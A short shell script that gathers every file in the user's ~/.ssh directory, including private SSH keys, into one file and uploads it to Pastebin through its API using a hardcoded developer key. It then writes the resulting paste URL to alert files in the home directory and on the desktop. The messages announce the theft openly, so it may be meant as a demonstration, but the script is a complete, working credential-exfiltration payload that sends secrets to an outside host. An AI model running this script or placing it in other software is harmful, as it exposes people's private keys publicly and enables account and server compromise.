cd ~/.ssh
msg1="attempting to upload your private ssh keys to pastebin..."
echo $msg1 >>~/alert.txt
echo $msg1 >>~/Desktop/alert.txt
touch ~/all-keys.txt
for f in *; do
    echo >>~/all-keys.txt
    echo $f >>~/all-keys.txt
    cat $f >>~/all-keys.txt
done
allkeys=$(cat ~/all-keys.txt)
url=$(curl -X POST \
    "https://pastebin.com/api/api_post.php" \
    -d 'api_dev_key=y87sCPeGINmbBOHh9MSW962KDQv7hlBb' \
    -d 'api_option=paste' \
    -d "api_paste_code=$allkeys")
msg2="your congrats, your ssh keys have been uploaded: $url"
echo $msg2
echo $msg2 >>~/alert.txt
echo $msg2 >>~/Desktop/alert.txt
# rm -f all-keys.txt
